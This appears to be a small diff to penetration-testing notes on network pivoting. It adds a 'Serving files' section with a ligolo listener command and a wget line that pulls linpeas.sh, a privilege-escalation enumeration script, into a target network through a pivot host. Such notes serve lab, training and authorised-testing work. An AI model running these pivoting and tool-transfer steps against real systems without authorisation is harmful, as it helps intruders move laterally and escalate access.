@@ -2370,3 +2370,8 @@ Windows Pivot
        v
 10.10.173.0/24
 ```
+### Serving files
+```bash
+listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 # on ligolo interface
+wget http://<PIVOT_INTERNAL_IP>/linpeas.sh
+```
